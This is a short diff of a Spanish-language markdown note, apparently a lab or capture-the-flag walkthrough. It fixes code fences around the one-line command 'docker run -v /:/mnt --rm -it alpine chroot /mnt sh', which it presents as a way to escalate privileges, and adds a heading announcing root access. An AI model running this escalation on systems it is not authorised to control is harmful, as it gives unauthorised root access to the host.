@@ -137,9 +137,8 @@ somos anurodh
 ### parece que estamos dentro de un docker. usaremos esto para escalar privilegios
 
 ```python
-	```
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-```
 ```
 
 ![[Pasted image 20231119220634.png]]
+### WE ARE ROOT.
